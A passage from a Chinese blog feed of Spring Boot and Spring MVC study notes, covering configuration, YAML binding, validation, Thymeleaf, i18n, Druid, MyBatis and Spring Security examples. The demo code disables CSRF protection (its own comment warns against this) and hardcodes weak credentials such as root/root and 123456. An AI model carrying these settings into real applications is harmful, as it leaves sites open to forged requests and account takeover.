packaged inside your jar (application.properties and YAML variants).2、Profile-specific application properties packaged inside your jar (application-&#123;profile&#125;.properties and YAML variants).3、Application properties outside of your packaged jar (application.properties and YAML variants).4、Profile-specific application properties outside of your packaged jar (application-&#123;profile&#125;.properties and YAML variants).</code></pre><p><font color="Red">最佳的一种方式就是：</font></p><p>在<code>classpath:/</code>下的<code>application.yaml</code>中配置我们的应用，多环境则配置相应的<code>application-&#123;profiles&#125;.yaml</code>，然后启动项目时在命令行中加上<code>spring.profiles.active</code>参数。</p><h2 id="二、YAML配置"><a href="#二、YAML配置" class="headerlink" title="二、YAML配置"></a>二、YAML配置</h2><p>springboot会读取的数据配置文件只有<code>application.properties</code>、<code>application.yaml</code>这两个，修改了文件名则不会生效。</p><p>推荐使用yaml配置文件。</p><h3 id="1、YAML语法"><a href="#1、YAML语法" class="headerlink" title="1、YAML语法"></a>1、YAML语法</h3><p>具体语法见这里：<a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">https://www.ruanyifeng.com/blog/2016/07/yaml.html</a></p><p>注意点：</p><ul><li><p><font color="Red">YAML语法对空格的要求及其严格，一定要小心。</font></p></li><li><p><font color="Red">Key-Value键值对中，key后后面冒号后面一定要加一个空格！！</font></p></li><li><p><font color="Red">缩进为两个空格，表示子属性，不能用tab符号。</font></p></li></ul><p>其中引用的使用建议使用EL表达式，而不是<code>&amp;</code>、<code>*</code>，因为EL表达式不仅可以因为该文件内的属性，还可以引用springboot给我们设置好的其他属性。还可以使用类似三元运算符。</p><pre><code class="yaml">number: $&#123;random.uuid&#125;version: $&#123;mysql.version&#125;number2: $&#123;value2:123&#125; # 若value2存在则使用value2的值，否则使用123</code></pre><h3 id="2、使用yaml给bean注入属性"><a href="#2、使用yaml给bean注入属性" class="headerlink" title="2、使用yaml给bean注入属性"></a>2、使用yaml给bean注入属性</h3><pre><code class="yaml">person:  name: yury757  age: 3  number: 10  happy: false  birth: 2020/12/02  maps:    k1: v1    k2: v2  lists:    - code    - music  dog:    name: 旺财3    age: 2</code></pre><p>配置了yaml后可以直接在对应的类上面用以下注解，来给bean注入属性。这个注解的作用是将配置文件中的属性值，映射到这个类的属性上。<code>prefix</code>的值就是配置文件中的某一个<code>Key</code>。</p><pre><code class="java">@ConfigurationProperties(prefix = &quot;person&quot;)</code></pre><pre><code class="java">@Component@ConfigurationProperties(prefix = &quot;person&quot;)public class Person &#123;    private String name;    private int age;    private Integer number;    private boolean happy;    private Date birth;    private Map&lt;String, Object&gt; maps;    private List&lt;Object&gt; lists;    private Dog dog;&#125;</code></pre><p>加了这个注解后IDEA会有一个红色的提示，pom.xml中加入以下依赖，就不会有了。</p><pre><code class="xml">&lt;!-- 用yaml注入对象属性值的依赖 --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;    &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;</code></pre><p><font color="Red">这种方式需要对应的类有 <code>无参构造方法</code> 和 <code>每个属性的setter方法</code>，不然会报错。</font></p><h3 id="3、JSR303校验"><a href="#3、JSR303校验" class="headerlink" title="3、JSR303校验"></a>3、JSR303校验</h3><p>即在属性上加一些注解可以对注入的值进行校验。</p><p>导入依赖</p><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><p>普通值校验</p><pre><code class="java">@Min            // 验证 Number 和 String 对象是否大等于指定的值  @Max            // 验证 Number 和 String 对象是否小等于指定的值  @DecimalMax //被标注的值必须不大于约束中指定的最大值. 这个约束的参数是一个通过BigDecimal定义的最大值的字符串表示.小数存在精度@DecimalMin //被标注的值必须不小于约束中指定的最小值. 这个约束的参数是一个通过BigDecimal定义的最小值的字符串表示.小数存在精度@Digits                     //验证 Number 和 String 的构成是否合法  @Digits(integer=,fraction=) // 验证字符串是否是符合指定格式的数字，interger指定整数精度，fraction指定小数精度。@Range(min=, max=)          // 校验值的大小是否在给定的范围内（可包含）@Range(min=10000,max=50000,message=&quot;range.bean.wage&quot;)private BigDecimal wage;@Valid // 递归的对关联对象进行校验, 如果关联对象是个集合或者数组,那么对其中的元素进行递归校验,如果是一个map,则对其中的值部分进行校验.(是否进行递归验证)@CreditCardNumber                             // 信用卡验证@Email                                        // 验证是否是邮件地址，如果为null,不进行验证，算通过验证。@ScriptAssert(lang= ,script=, alias=)         // 脚本代码段验证，lang为哪种语言@URL(protocol=,host=, port=,regexp=, flags=)  // url验证</code></pre><p>空检查</p><pre><code class="javascript">@Null       // 验证对象是否为null@NotNull    // 验证对象是否不为null, 无法查检长度为0的字符串@NotBlank   // 检查约束字符串是不是Null还有被Trim的长度是否大于0,只对字符串,且会去掉前后空格.@NotEmpty   // 检查约束元素是否为NULL或者是EMPTY.</code></pre><p>Booelan检查</p><pre><code class="java">@AssertTrue     // 验证 Boolean 对象是否为 true  @AssertFalse    // 验证 Boolean 对象是否为 false</code></pre><p>长度检查</p><pre><code class="java">@Size(min=, max=)   // 验证对象（Array,Collection,Map,String）长度是否在给定的范围之内  @Length(min=, max=) // 验证string字符串的长度是否在给定的范围指内</code></pre><p>日期检查</p><pre><code class="java">@Past       // 验证 Date 和 Calendar 对象是否在当前时间之前  @Future     // 验证 Date 和 Calendar 对象是否在当前时间之后  @Pattern    // 验证 String 对象是否符合正则表达式的规则</code></pre><h2 id="三、使用springboot开发web"><a href="#三、使用springboot开发web" class="headerlink" title="三、使用springboot开发web"></a>三、使用springboot开发web</h2><pre><code class="xml">        &lt;!-- web启动器--&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- 用yaml注入对象属性值 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;            &lt;optional&gt;true&lt;/optional&gt;        &lt;/dependency&gt;        &lt;!-- 属性校验 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-validation&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- thymeleaf模板引擎 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- 系统功能监控、统计相关 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;!-- 单元测试 --&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;/dependency&gt;</code></pre><h3 id="1、静态资源存放位置"><a href="#1、静态资源存放位置" class="headerlink" title="1、静态资源存放位置"></a>1、静态资源存放位置</h3><p>（1）webjars静态资源（一般不这么用）</p><p>从webjars导入的静态资源的访问路径是：<code>classpath</code> + 导入的webjars包在<code>META-INF/resources/</code>后面的路径。</p><p>（2）其他静态资源</p><p>（从左到右优先级依次降低，即同一个静态资源，会先拿最左边的）：</p><pre><code class="java">&#123;&quot;classpath:/resources/&quot;, &quot;classpath:/static/&quot;, &quot;classpath:/public/&quot;&#125;</code></pre><p>配置文件中，以下配置的默认值是<code>/**</code>，即把类路径当作根目录，再去找上面的三个文件夹。若修改了这里，比如改成了<code>/test/**</code>，则要通过<code>/test/</code>这个路径才能找到对应的资源。所以<font color="Red">千万不要</font>设置下面这个配置。</p><pre><code class="yaml">spring  mvc    static-path-pattern: /**</code></pre><p><font color="Red">即我们只要将静态资源放在resources、static、public下的任意一个位置就可以了，按照自己喜好分类放置。</font></p><p><font color="Red">注意<code>template</code>目录和外部的目录是无法直接访问到的。</font></p><h3 id="2、模板引擎"><a href="#2、模板引擎" class="headerlink" title="2、模板引擎"></a>2、模板引擎</h3><h4 id="（1）thymeleaf"><a href="#（1）thymeleaf" class="headerlink" title="（1）thymeleaf"></a>（1）thymeleaf</h4><ul><li>pom.xml依赖</li></ul><p>若springboot版本没有thymeleaf启动器，则引入以下依赖。</p><pre><code class="xml">&lt;!-- thymeleaf模板引擎，最好使用3.x --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.thymeleaf&lt;/groupId&gt;    &lt;artifactId&gt;thymeleaf-spring5&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.thymeleaf.extras&lt;/groupId&gt;    &lt;artifactId&gt;thymeleaf-extras-java8time&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><p>如有启动器，则直接引入启动器的依赖即可，引入以下依赖反而报错。</p><pre><code class="xml">&lt;!-- thymeleaf模板引擎 --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><ul><li>同样按上面的方法找到我们需要在配置文件中需要配置的属性，找到下面这个类</li></ul><pre><code class="java">@ConfigurationProperties(prefix = &quot;spring.thymeleaf&quot;)public class ThymeleafProperties &#123;    private static final Charset DEFAULT_ENCODING = StandardCharsets.UTF_8;    public static final String DEFAULT_PREFIX = &quot;classpath:/templates/&quot;;    public static final String DEFAULT_SUFFIX = &quot;.html&quot;;    private boolean checkTemplate = true;    private boolean checkTemplateLocation = true;    private String prefix = DEFAULT_PREFIX;    private String suffix = DEFAULT_SUFFIX;    private String mode = &quot;HTML&quot;;    private Charset encoding = DEFAULT_ENCODING;    private boolean cache = true;    private Integer templateResolverOrder;    private String[] viewNames;    private String[] excludedViewNames;    private boolean enableSpringElCompiler;    private boolean renderHiddenMarkersBeforeCheckboxes = false;    private boolean enabled = true;    private final Servlet servlet = new Servlet();    private final Reactive reactive = new Reactive();&#125;</code></pre><p>从上面可以看到thymeleaf使用的前缀是<code>classpath:/templates/</code>，后缀是<code>.html</code>，因此我们要把html文件放到templates目录下，才会生效。</p><p>在html中加入thymeleaf的命名空间，就可以使用thymeleaf的语法了。</p><pre><code class="html">&lt;html lang=&quot;en&quot; xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;</code></pre><p><strong>一定要了解的thymeleaf语法：</strong></p><p>Variable Expression：<code>$&#123;&#125;</code></p><p>Selection Variable Expression：<code>*&#123;&#125;</code></p><p>Message Expression：<code>#&#123;&#125;</code></p><p>Link Url Expression：<code>@&#123;&#125;</code></p><p>Fragment Expression：<code>~&#123;&#125;</code></p><h3 id="3、自定义扩展webmvc"><a href="#3、自定义扩展webmvc" class="headerlink" title="3、自定义扩展webmvc"></a>3、自定义扩展webmvc</h3><ul><li>写一个配置类，要实现WebMvcConfigurer接口，并加上@Configuration注解</li><li>想加入一个自定义视图解析器，则自定义一个视图解析器类（视图解析器类要实现接口ViewResolver），然后定一个@bean的方法，返回这个类就注册好了。</li><li>想加入一个自定义拦截器，则定义一个拦截器（拦截器要实现接口HandlerInterceptor），然后重写addInterceptors方法，把拦截器注册进去，再配置好需要拦截的url pattern即可。</li></ul><pre><code class="java">package com.yury757.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.HandlerInterceptor;import org.springframework.web.servlet.View;import org.springframework.web.servlet.ViewResolver;import org.springframework.web.servlet.config.annotation.InterceptorRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.util.Locale;// 自定义视图解析器步骤// 写一个配置类，要实现WebMvcConfigurer接口，并加上@Configuration注解@Configurationpublic class MyMvcConfig implements WebMvcConfigurer &#123;    // 往IOC容器中注册一个bean    @Bean    public MyViewResolver getMyViewResolver()&#123;        return new MyViewResolver();    &#125;    // 自定义视图解析器    public static class MyViewResolver implements ViewResolver &#123;        @Override        public View resolveViewName(String viewName, Locale locale) throws Exception &#123;            return null;        &#125;    &#125;    // 注册拦截器    @Override    public void addInterceptors(InterceptorRegistry registry) &#123;        registry.addInterceptor(new MyInterceptor())                .addPathPatterns(&quot;/**&quot;)                .excludePathPatterns(&quot;/*.js&quot;, &quot;/*.css&quot;);    &#125;    // 自定义拦截器    private static class MyInterceptor implements HandlerInterceptor &#123;        @Override        public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123;            System.out.println(request.getRequestURI());            return true;        &#125;    &#125;&#125;</code></pre><h3 id="4、国际化（i18n）"><a href="#4、国际化（i18n）" class="headerlink" title="4、国际化（i18n）"></a>4、国际化（i18n）</h3><p>sources目录下新建一个<code>i18n</code>目录，再新建以下三个配置文件（这里只能使用<code>.properties</code>，不能使用<code>.yaml</code>）：</p><pre><code>login.propertieslogin_en_US.propertieslogin_zh_CN.properties</code></pre><p>会发现这三个被绑定在一起了，然后就可以像正常输入配置文件一样，在对应的语言配置中输入变量及对应语言的内容。</p><pre><code class="properties"># login.propertieslogin.btn=登录login.password=密码login.rememberMe=记住我login.tips=请登录login.username=用户名# login_en_US.propertieslogin.btn=Sign Inlogin.password=passwordlogin.rememberMe=remember melogin.tips=Please Login Inlogin.username=username# login_zh_CN.propertieslogin.btn=登录login.password=密码login.rememberMe=记住我login.tips=请登录login.username=用户名</code></pre><p>然后在html中就可以使用这里面的变量，不同的模板引擎有不同的写法，如thymeleaf的写法是：</p><pre><code class="html">#&#123;login.tips&#125;&lt;div class=&quot;text-center mb-4&quot;&gt;    &lt;img class=&quot;mb-4&quot; src=&quot;https://getbootstrap.com/docs/4.0/assets/brand/bootstrap-solid.svg&quot; alt=&quot;&quot; width=&quot;72&quot; height=&quot;72&quot;&gt;    &lt;h1 class=&quot;h3 mb-3 font-weight-normal&quot; th:text=&quot;#&#123;login.tips&#125;&quot;&gt;&lt;/h1&gt;&lt;/div&gt;</code></pre><p>最后还要在webmvc组件中配置国际化处理器，以及将处理器注册到bean中的配置类，如下：</p><pre><code class="java">package com.yury757.config;import org.springframework.web.servlet.LocaleResolver;import org.thymeleaf.util.StringUtils;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.util.Arrays;import java.util.Locale;// 国际化处理器public class MyLocaleResolver implements LocaleResolver &#123;    // 解析请求，精简版，不能直接在工作中使用    @Override    public Locale resolveLocale(HttpServletRequest request) &#123;        String l = request.getParameter(&quot;l&quot;);        Locale locale = Locale.getDefault();        if (!StringUtils.isEmpty(l))&#123;            String[] s = l.split(&quot;_&quot;);            locale = new Locale(s[0], s[1]);        &#125;        return locale;    &#125;    @Override    public void setLocale(HttpServletRequest request, HttpServletResponse response, Locale locale) &#123;&#125;&#125;</code></pre><pre><code class="java">package com.yury757.config;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.LocaleResolver;import org.springframework.web.servlet.config.annotation.ViewControllerRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;@Configurationpublic class MyWebMvcConfigurer implements WebMvcConfigurer &#123;    @Override    public void addViewControllers(ViewControllerRegistry registry) &#123;        registry.addViewController(&quot;/index.html&quot;).setViewName(&quot;/index&quot;);        registry.addViewController(&quot;/&quot;).setViewName(&quot;/index&quot;);    &#125;    // 注册bean，使用我们自己写的国际化组件    // 注意！！！！！这里方法名要用和类名一样，且首字母小写    @Bean    public LocaleResolver localeResolver()&#123;        return new MyLocaleResolver();    &#125;&#125;</code></pre><h2 id="四、SpringBoot整合其他组件"><a href="#四、SpringBoot整合其他组件" class="headerlink" title="四、SpringBoot整合其他组件"></a>四、SpringBoot整合其他组件</h2><p>pom中以<code>spring-boot-starter-</code>开头的就是springboot官方的，以<code>-spring-boot-starter</code>结尾的就是对应组件的公司自己写的。</p><h3 id="（1）整合Druid数据源"><a href="#（1）整合Druid数据源" class="headerlink" title="（1）整合Druid数据源"></a>（1）整合Druid数据源</h3><pre><code class="xml">&lt;!-- log4j2 --&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;    &lt;version&gt;2.4.3&lt;/version&gt;&lt;/dependency&gt;&lt;!-- druid数据源 --&gt;&lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;/groupId&gt;    &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;1.2.5&lt;/version&gt;&lt;/dependency&gt;</code></pre><pre><code class="yaml">spring:  datasource:    driver-class-name: com.mysql.cj.jdbc.Driver    type: com.alibaba.druid.pool.DruidDataSource    druid:      username: root      password: root      url: jdbc:mysql://localhost:3306/mybatis?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=true&amp;serverTimezone=UTC      # 最大等待时间，配置获取连接等待超时，时间单位都是毫秒ms      max-wait: 60000      # 最大值      max-active: 20      #最小值      min-idle: 5      #初始化大小      initial-size: 5      #配置一个连接在池中最小生存的时间      min-evictable-idle-time-millis: 60000      #配置间隔多久才进行一次检测，检测需要关闭的空闲连接      time-between-eviction-runs-millis: 300000      test-on-borrow: false      test-on-return: false      test-while-idle: true      pool-prepared-statements: true      #最大PSCache连接      max-pool-prepared-statement-per-connection-size: 20      use-global-data-source-stat: true      # 通过connectProperties属性来打开mergeSql功能；慢SQL记录      connection-properties: druid.stat.mergeSql=true;druid.stat.slowSqlMillis=500      # 配置监控统计拦截的filters，去掉后监控界面sql无法统计，      # wall用于防火墙      filter:        stat:          enabled: true        wall:          enabled: true        log4j2:          enabled: true      # 配置StatFilter      web-stat-filter:        # 默认为false，设置为true启动        enabled: true        exclusions: &quot;*.js,*.gif,*.jpg,*.bmp,*.png,*.css,*.ico,/druid/*&quot;      # 配置StatViewServlet      stat-view-servlet:        url-pattern: &quot;/druid/*&quot;        # 允许哪些ip        login-username: root        login-password: root        # 禁止哪些ip        deny: 192.168.1.102        # 是否可以重置        reset-enable: true        # 启用        enabled: true</code></pre><h3 id="（2）整合mybatis"><a href="#（2）整合mybatis" class="headerlink" title="（2）整合mybatis"></a>（2）整合mybatis</h3><pre><code class="xml">&lt;dependency&gt;    &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt;    &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt;    &lt;version&gt;2.1.4&lt;/version&gt;&lt;/dependency&gt;</code></pre><pre><code class="yaml">mybatis:  type-aliases-package: com.yury757.pojo  mapper-locations: classpath:mybatis/mapper/*.xml</code></pre><pre><code class="java">package com.yury757.mapper;import com.yury757.pojo.User;import org.apache.ibatis.annotations.Mapper;import org.springframework.stereotype.Repository;import org.springframework.web.bind.annotation.RequestParam;import java.util.List;@Mapper@Repositorypublic interface UserMapper &#123;    public List&lt;User&gt; selectList();    public User selectById(@RequestParam(&quot;id&quot;) int id);    public int addUser(User user);    public int updateUser(User user);    public int deleteUser(@RequestParam(&quot;id&quot;) int id);&#125;</code></pre><h2 id="五、网站安全"><a href="#五、网站安全" class="headerlink" title="五、网站安全"></a>五、网站安全</h2><p>这部分内容用过滤器和拦截器也可以做到，只是以下两个框架可以使我们的安全组件更高效更简化。</p><h3 id="1、SpringSecurity"><a href="#1、SpringSecurity" class="headerlink" title="1、SpringSecurity"></a>1、SpringSecurity</h3><p><strong>功能：身份验证（Authentication）和访问控制（Authorization）</strong></p><p>很重要的几个类或注解：</p><ul><li>WebSecurityConfigurerAdapter：想要自定义安全策略，只要继承这个类就可以，重写里面的方法即可</li><li>AuthenrcationManagerBuilder：自定义认证策略</li><li>@EnableWebSecurity：开启WebSecurity模式</li></ul><pre><code class="java">@EnableWebSecuritypublic class MySecurityConfig extends WebSecurityConfigurerAdapter &#123;    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        super.configure(http);    &#125;&#125;</code></pre><pre><code class="java">package com.yury757.config;import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;import org.springframework.security.config.annotation.web.builders.HttpSecurity;import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;import javax.sql.DataSource;@EnableWebSecuritypublic class MySecurityConfig extends WebSecurityConfigurerAdapter &#123;    private DataSource dataSource;    // 自定义授权规则    @Override    protected void configure(HttpSecurity http) throws Exception &#123;        // 首页所有人可以访问，功能页只有对应权限的人才能访问        http.authorizeRequests()                .antMatchers(&quot;/&quot;).permitAll()                .antMatchers(&quot;/level1/**&quot;).hasRole(&quot;vip1&quot;)                .antMatchers(&quot;/level2/**&quot;).hasRole(&quot;vip2&quot;)                .antMatchers(&quot;/level3/**&quot;).hasRole(&quot;vip3&quot;);        // 没有权限，跳到登录页面        http.formLogin().loginPage(&quot;/toLogin&quot;).loginProcessingUrl(&quot;/login&quot;).defaultSuccessUrl(&quot;/index&quot;);        // 使用自己的登录页面和自己的登录处理逻辑时，要禁用csrf防护        // 千万不要禁用csrf，及找其他方式处理登录页面        http.csrf().disable();        // 开启注销功能        http.logout();        // 开启“记住我”功能，实际上就是丢了一个“rememberMe”的cookie，默认保存两周        http.rememberMe();    &#125;    // 自定义认证规则    // 在spring security5中，需要不能直接使用密码，要加密使用    @Override    protected void configure(AuthenticationManagerBuilder auth) throws Exception &#123;        // 这些数据正常应该从数据库里面读取        auth.inMemoryAuthentication().passwordEncoder(new BCryptPasswordEncoder())                .withUser(&quot;yury757&quot;).password(new BCryptPasswordEncoder().encode(&quot;123456&quot;)).roles(&quot;vip2&quot;, &quot;vip3&quot;)                .and()                .withUser(&quot;root&quot;).password(new BCryptPasswordEncoder().encode(&quot;123456&quot;)).roles(&quot;vip1&quot;, &quot;vip2&quot;, &quot;vip3&quot;)                .and()                .withUser(&quot;guest&quot;).password(new BCryptPasswordEncoder().encode(&quot;123456&quot;)).roles(&quot;vip1&quot;);    &#125;&#125;</code></pre><h3 id="2、Shiro"><a href="#2、Shiro" class="headerlink" title="2、Shiro"></a>2、Shiro</h3><p>也是一个安全组件。可以脱离web使用。</p><p>重要的三个对象：</p><ul><li>Subject：应用代码直接交互的对象，即外部浏览器或爬虫调用我们服务器api的用户。</li><li>SecurityManager：安全管理器，管理所有的subject</li><li>Realm：连接数据</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;font color=&quot;Red&quot;&gt;约定大于配置！！&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;版本：SpringBoot-2.4.3&lt;/p&gt;
&lt;h2 id=&quot;一、springboot使用简介&quot;&gt;&lt;a href=&quot;#一、springboot使用简介&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="java" scheme="https://yury757.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://yury757.github.io/tags/java/"/>
    
    <category term="springboot" scheme="https://yury757.github.io/tags/springboot/"/>
    
  </entry>
  
  <entry>
    <title>springMVC-study</title>
    <link href="https://yury757.github.io/java/springMVC/SpringMVC-Study"/>
    <id>https://yury757.github.io/java/springMVC/SpringMVC-Study</id>
    <published>2021-08-23T16:00:00.000Z</published>
    <updated>2021-08-27T16:52:11.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、回顾Servlet"><a href="#一、回顾Servlet" class="headerlink" title="一、回顾Servlet"></a>一、回顾Servlet</h2><pre><code class="java">// 转发，forwardrequest.getRequestDispatcher(&quot;/WEB-INF/jsp/hello.jsp&quot;).forward(request, response);// 重定向，redirectresponse.sendRedirect(&quot;/index.jsp&quot;);</code></pre><pre><code class="xml">&lt;!-- session失效时间，单位分钟 --&gt;&lt;session-config&gt;    &lt;session-timeout&gt;1&lt;/session-timeout&gt;&lt;/session-config&gt;</code></pre><h2 id="二、SpringMVC开始"><a href="#二、SpringMVC开始" class="headerlink" title="二、SpringMVC开始"></a>二、SpringMVC开始</h2><h3 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h3><p><font color="Red">约定大于配置。</font></p><p>最重要的一个类：<code>DispatcherServlet</code></p><pre><code class="java">public class DispatcherServlet extends FrameworkServlet&#123;    public DispatcherServlet(WebApplicationContext webApplicationContext) &#123;        super(webApplicationContext);        setDispatchOptionsRequest(true);    &#125;        protected void doService(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;&#125;        protected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;&#125;        &#125;</code></pre><p><img src="/images/DispatcherServlet.png"></p><p><font color="Red">这个类的作用就是就是把不同的请求分发到不同的类。</font></p><h3 id="2、配置springmvc（重要！）"><a href="#2、配置springmvc（重要！）" class="headerlink" title="2、配置springmvc（重要！）"></a>2、配置springmvc（重要！）</h3><h4 id="1、web-xml"><a href="#1、web-xml" class="headerlink" title="1、web.xml"></a>1、web.xml</h4><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;         version=&quot;4.0&quot;&gt;    &lt;!-- 开始配置SpringMVC --&gt;    &lt;!-- 1、注册DispatcherServlet --&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;        &lt;!-- 关联一个springmvc配置文件，本质是一个spring配置文件 --&gt;        &lt;init-param&gt;            &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;            &lt;param-value&gt;classpath:springmvc-config.xml&lt;/param-value&gt;        &lt;/init-param&gt;        &lt;!-- 启动级别 --&gt;        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;    &lt;/servlet&gt;        &lt;!--    / 和 /* 是有区别的，用/，不能用/*    /  ：匹配所有请求，不会匹配jsp    /* ：匹配所有请求，包括jsp，即把返回一个.jsp页面也当作了一个请求     --&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;springmvc&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><h4 id="2、springmvc-config-xml"><a href="#2、springmvc-config-xml" class="headerlink" title="2、springmvc-config.xml"></a>2、springmvc-config.xml</h4><p>本质是一个spring配置文件</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;       xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans        https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;!-- 处理器映射器，有多种映射器 --&gt;    &lt;!-- 这种映射器是通过bean的名字查找 --&gt;    &lt;bean class=&quot;org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping&quot; /&gt;    &lt;!-- 处理器适配器 --&gt;    &lt;bean class=&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot; /&gt;    &lt;!-- 视图解析器，配置了前后缀，以后重定向到某个jsp时就可以不用写前后缀了 --&gt;    &lt;bean id=&quot;internalResourceViewResolver&quot; class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt;        &lt;!-- 前缀 --&gt;        &lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/jsp/&quot;/&gt;        &lt;!-- 后缀 --&gt;        &lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;/&gt;    &lt;/bean&gt;    &lt;!-- 配置handler --&gt;    &lt;!-- 上面那个映射器会去查找和url名字相同的bean id --&gt;    &lt;!-- 找到之后上面那个适配器就会把请求交给对应bean的class去处理 --&gt;    &lt;bean id=&quot;/hello2&quot; class=&quot;org.yuyr757.controller.Hello2Controller&quot;/&gt;&lt;/beans&gt;</code></pre><p>如下图</p><ul><li>配置<code>处理器映射器</code>就是为了做2、3、4三步，去找到对应的handler</li><li>配置<code>处理器适配器</code>就是为了做5、6、7、8四步，把对应的handler交给controller处理</li><li>配置<code>视图解析器</code>就是为了做9、10、11、12四步，把controller处理好的带model和view名字的MV对象交给视图解析器，先去处理对应的jsp，然后把生成好的页面返回给浏览器。</li></ul><p><img src="/images/SpringMVC-Flow.png"></p><h3 id="3、配置springmvc时404的问题"><a href="#3、配置springmvc时404的问题" class="headerlink" title="3、配置springmvc时404的问题"></a>3、配置springmvc时404的问题</h3><p>原因之一可能是：IDEA的项目结构中的<code>Artifacts</code>的<code>utput Layout</code>要确保<code>WEB-INF</code>目录下有<code>classes</code>和<code>lib</code>两个目录，若没有<code>lib</code>目录，则新建一个，然后把所有我们的依赖包放到<code>lib</code>目录中。</p><p><img src="/images/404solution.png"></p><h3 id="4、使用springmvc"><a href="#4、使用springmvc" class="headerlink" title="4、使用springmvc"></a>4、使用springmvc</h3><p>这里是采用实现Controller接口的方式，不建议使用，建议使用下面注解开发。</p><pre><code class="java">package org.yuyr757.controller;import org.springframework.web.servlet.ModelAndView;import org.springframework.web.servlet.mvc.Controller;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;// 注意！！这个Controller是org.springframework.web.servlet.mvc.Controller，是一个接口// 